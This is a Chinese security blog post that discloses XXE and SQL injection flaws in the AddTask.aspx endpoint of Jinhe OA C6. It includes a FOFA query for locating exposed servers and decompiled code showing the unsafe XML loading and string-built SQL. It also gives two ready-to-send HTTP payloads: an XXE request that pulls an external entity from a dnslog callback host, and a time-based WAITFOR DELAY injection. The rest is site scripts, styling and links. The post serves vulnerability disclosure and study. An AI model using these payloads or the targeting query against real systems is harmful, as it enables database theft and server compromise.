---
title: "金和OA AddTask.aspx XXE漏洞+SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-AddTask-sqli-xxe.html
asset_dir: assets/金和oa-addtask.aspx-xxe漏洞+sql注入漏洞
---

# 金和OA AddTask.aspx XXE漏洞+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/9 12:26
* 1296浏览
* [0评论](#comment)
* 43分钟阅读

深入探索

SQL

服务器

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `AddTask.aspx` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)，同时该接口还存在[XXE](https://mrxn.net/tag/XXE)漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

在线安全工具

网络安全会议

安全认证考试

先看下 AddTask.aspx 的实现

```
<%@ Page language="c#" Codebehind="AddTask.aspx.cs" AutoEventWireup="True" Inherits="JHSoft.Web.DailyTaskManage.AddTask" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<HTML>
    <HEAD>
       <title>AddTask</title>
       <meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
       <meta name="CODE_LANGUAGE" Content="C#">
       <meta name="vs_defaultClientScript" content="JavaScript">
       <meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">
    </HEAD>
    <body>
       <form id="Form1" method="post" runat="server">

       </form>
    </body>
</HTML>
```

在 bin 目录下查找 `JHSoft.Web.DailyTaskManage.dll` 将其进行反编译后找到 `AddTask` 的处理逻辑

SQL注入防护

```
private XmlDocument xmlDocument = new XmlDocument();
public string XmlStr;
protected HtmlForm Form1;

protected void Page_Load(object sender, EventArgs e)
{
  this.xmlDocument.Load(this.Request.InputStream);
  string innerText = this.xmlDocument.SelectSingleNode("//root//Page//PageName").InnerText;
  this.XmlStr = this.xmlDocument.DocumentElement.OuterXml;
  this.Xml(innerText);
}

private void Xml(string strPageName)
{
  string str1 = string.Empty;
  string empty1 = string.Empty;
  string empty2 = string.Empty;
  string empty3 = string.Empty;
  string str2 = strPageName;
  if (str2 != null)
  {
    if (!string.op_Equality(str2, "TaskDetect"))
    {
      if (string.op_Equality(str2, "TaskAdd"))
        ;
    }
    else
      str1 = new DetectCls().DetectResource("Calendar", "1", this.xmlDocument.SelectSingleNode("//root//TaskExecutorID").InnerText, this.xmlDocument.SelectSingleNode("//root//StartTime").InnerText, this.xmlDocument.SelectSingleNode("//root//EndTime").InnerText) ? "0" : "1";
  }
  ((Control) this).Page.Response.Write(str1);
  this.Response.End();
}
```

请求内容直接使 `xmlDocument.Load` 加载处理，造成[XXE漏洞](https://mrxn.net/tag/XXE)。

再跟进 `DetectCls` 的 `DetectResource` 方法，其实现如下

代码安全审计

```
public bool DetectResource(
  string strModeId,
  string strResourceType,
  string strResourceId,
  string strStartTime,
  string strEndTime)
{
  if (string.op_Equality(strResourceId, ""))
    return false;
  strResourceId = $"'{strResourceId.Replace(",", "','")}'";
  if (((InternalDataCollectionBase) this.op.ExecSQLReDataTable($"select id,starttime,endtime from resourcedetect where modeid='{strModeId}' and resourcetype='{strResourceType}' and resourceid in ({strResourceId}) and ((datediff(minute,'{strStartTime}',starttime)<=0 and datediff(minute,'{strEndTime}',endtime)>=0) or  (datediff(minute,'{strStartTime}',starttime)<=0 and datediff(minute,'{strStartTime}',endtime)>=0 and datediff(minute,'{strEndTime}',endtime)<=0) or  (datediff(minute,'{strStartTime}',starttime)>=0 and datediff(minute,'{strEndTime}',starttime)<=0 and datediff(minute,'{strEndTime}',endtime)>=0) or  (datediff(minute,'{strStartTime}',starttime)>=0 and datediff(minute,'{strEndTime}',endtime)<=0))").Rows).Count > 0 || this.op.IsError)
  {
    this.StrErrorMessage = this.op.ErrorMessage;
    return false;
  }
  return this.RegisterResource(strModeId, strResourceType, strResourceId, strStartTime, strEndTime);
}
```

参数 `strResourceId` 被直接拼接进 `ExecSQLReDataTable` SQL语句中执行，无任何过滤或校验，导致[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)。

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.dailytaskmanage/AddTask.aspx/ HTTP/1.1
Content-Type: application/xml
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.vk8uek6g.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

[![金和OA AddTask.aspx XXE漏洞+SQL注入漏洞](images/img-001-a17b8968ebbd.webp)](https://image.mrxn.net/3c4e418dd4c74201b148398cef7e9368.webp)

## SQL注入

```
POST /c6/Jhsoft.Web.dailytaskmanage/AddTask.aspx/ HTTP/1.1
Content-Type: application/xml
Host: jhsoft.mrxn.net

<root>
  <Page>
    <PageName>TaskDetect</PageName>
  </Page>
  <StartTime>2023-01-01 00:00:00</StartTime>
  <EndTime>2023-01-01 00:00:00</EndTime>
  <TaskExecutorID>3');WAITFOR DELAY'0:0:5'-- </TaskExecutorID>
</root>
```

[![金和OA AddTask.aspx XXE漏洞+SQL注入漏洞](images/img-002-63b32c83d37d.webp)](https://image.mrxn.net/35443d5febba42ceb7909e969b018de6.webp)

成功延时 5 秒钟

计算机服务器

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.XXE](#toc-5-1-)
* [5.2.SQL注入](#toc-5-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA AddTask.aspx XXE漏洞+SQL注入漏洞](https://mrxn.net/jswz/jhsoft-AddTask-sqli-xxe.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-AddTask-sqli-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-AddTask-sqli-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞扫描服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKfUlEQVR4AeycgXbjuA5Dc+f//3m3MAuJkWjHmaaJz656hgUFgLRGjJpm9p3353a7/fPT+Of7y32+lxtU3CYM3+zLOFju9mmt8h9xrst45Jdmr3KHOaP5n6IG8tVj/bnKCbSBfE369ky84y8A3IDyUcCkwcy52H83r/cQoof9Qtjnqj6qeSZyjzaQTK78cycwDQTi1QA1Hm3Vr4rsMQdzv+w7yiFq3esZdF+IHl4LIbjcT/xeQPiB9tNkzyseuh/mXJ4xpoGMhrV+7wmsgbz3vB8+7aUDgf1rmX8sOH+4uycNsP98t4LuqfZhDrrPte/Alw7kHRv+rz/jVwbiV5mwOkDorz6IXF5F5RevgPBCx+yXR5E55+LHsAZ1P+vGXG/u1fgrA7m9epf/o35rIBcb9jSQfC2r/Mz+of8IgMirutwfZp/1qtYcRB1gqn1GUL1JYPpkb61C1TqsQ/SAjtYqdP0eVjXTQCrT4t53Am0g0KcOj/OjLeZXxJGv0nItxD6OfJUGUQdUcuOA7dY8+0z5W5MigegL5zC3aAPJ5Mo/dwJrIJ87+/LJf3T9fhru7D5e76F90K+0ub0a8fYIIWqVO+QZA8I38nkN4YH+j4bQOXuhc+Mzvf4prhvi074IHg4E4hVR7RVCAyYZ2N4sgUnLRH41mQeeqoXuh8jdS+hnKFdAeAAtt7BHCGzPVz7GZj7xDaIHzJjLYdYPB5KLL5D/L7bwB2JK1d/WrxAID9Bs1oSNLBLpikLaXonAhtbldZgzQniho7Wz6N4ZH9VCPC/XQHCuhVhDfx/K/spnLuO6Ifk0LpCvgVxgCHkLbSDQrxxEbmO+ehAa7GP2u0dGiNrsg+Cyb8yz33n2VBxE3yPtUQ/rEL2g/1iC4OwRQnDQUfwY3lPGNpDRvNafOYHpg2HeBvQJQ+TW81SdW8sIUQcd7YfO5Zq9HGa/ewkhdOWOvV57PESPrLtXRuuZO5O7bg/XDdk7mQ/xayAfOvi9x7bPITBfVRflq2gOwg+Yav9hqBE7CXD32UM2P0O5wxyE32shBGfvI4TwQ0fXwGs46H0At98Q2P7O2rsDgoOO64Zsx3Wdb+1NvdqSJ3mkyQN9wnCfS1fkHlqPAfd10Ne5dszh2OfnuM7rjNaE5pU7IJ5hTWjNKG4Ma48w160b8ui03qyvgbz5wB89rr2p52vj3MUQVxYwtb1BARuOfq+FLlDugKiz9gjHOuiflB/VQjzLPbIfQnvEZd05RK37QqwBW+7QvjvyewFs5wjc1g25XeurvalDnxLc53nLnnTGrCuHXq+1AjrnWpg5a0LVKSB8yo9CNYrs0VphDqIX9Fsm3WFfhTDXHvmyBlGbOT8z47oh+YQukK+BXGAIeQttIL42Waw46xBXEDBVIrC9YZViQUL4of9IKWxbT+BOAhoP9/md8XsB9x7gW7mHo3Ow0x6hub/BNpC/KV41uyfw10IbCLC9ujRhx1FXe4T2KVd4nVG8A+JZWYfg7BHCzIlX5Frn4sewZsz6Kzj3gNgrYOoO/VxgO2eg6UDj2kCaupKPnkD7YOhdQJ8WRO7pCivfyMk3hj0ZR4/WlQ6xD+iYfc6h6xC5eiog1tDRdRnlVWQOoiZzzmHWVK+A0ADb7xDYbkYm1w3Jp3GBfA3kAkPIW2if1HXFxshG5xDXLHvhnrNXCKFBR/EK6BxELn6M/Kxnc/eq6qxBPBswtf0oATZsZEogtKovzBrMnGtT2/VvWfkwrpC3N3WICeZNeYIQGtBkYHv1ABPXiJS4V8YktxSY+lqEWYPOwXO59+L+jxB6f9dC5yDyqs9Z/3oPqU7vg9wayAcPv3p0G4ivVDZVuX0VVv5nudwX4kcABD7qlWudjzXmhdaUO2D/WfYIIXzKFe4l1Fqh/NloA3m2cPl/5wRODUTTdngbEK8Q6FhpY508EDXKz4R7ZDyqg+gPNJtrG/GVANsvEF9p+1P5LEL4Yf6XaNcJKz9ErXSHfV4LTw3EhQt//wTWQH7/jJ96QvukXlVBXDOYUdfrTMBc62flenPQ/dahc3Cf2yOE0NxLKF4B+5p8Dgifao7CfiNEHXSs6qHrVe26IT6Vi2D7pO79QJ9gNWFz0H0QedXDnOuE5iDqoL9JSndA6F67Tlhx4hXWhForlCsgegKidwPY3vCB5gEaB/d5M30leo7iK53+iB8jm9YNyadxgfzwPcT7g/5qMDdOWWsIn/IxXCe0ptwBUet1Rpg1CA46ui90Du7z3PdsDtEj+/0sc14L